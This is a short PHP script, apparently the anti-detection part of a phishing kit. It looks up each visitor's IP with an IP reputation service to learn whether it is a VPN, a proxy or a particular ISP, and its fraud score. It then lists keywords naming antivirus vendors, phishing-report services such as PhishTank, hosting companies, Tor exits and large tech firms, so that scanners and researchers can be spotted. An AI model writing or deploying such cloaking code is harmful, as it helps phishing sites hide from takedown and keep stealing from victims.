<?php
// Read the JSON data from file
$json_data = file_get_contents('function/config.json');
// Decode JSON data into PHP array
$config = json_decode($json_data, true);
// ipquality score
$score	= 75;

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://www.ipqualityscore.com/api/json/ip/". $config['ipQuality'] ."/".$_SERVER['REMOTE_ADDR']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$result = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }else{
    $details = json_decode($result, true);
    $message=$details['message'];
    $vpn=$details['vpn'];
    $ISP=$details['ISP'];
    $proxy=$details['proxy'];
    $country_code=$details['country_code'];
	$fraud_score=$details['fraud_score'];
	curl_close($ch);
}
$words = "
avast
google
avira
phistank
pilot 
scanurl 
above 
hosting 
drweb 
facebook 
softlayer 
amazon 
cyveillance 
calyxinstitute 
tor-exit 
dreamhost 
twitter 
scanner 
phising 
microsoft 
symantec 
eset 
godaddy 
phishtank 
apple 
yahoo 
bing 
security 
secure 
antivirus 
phiser
phisher";

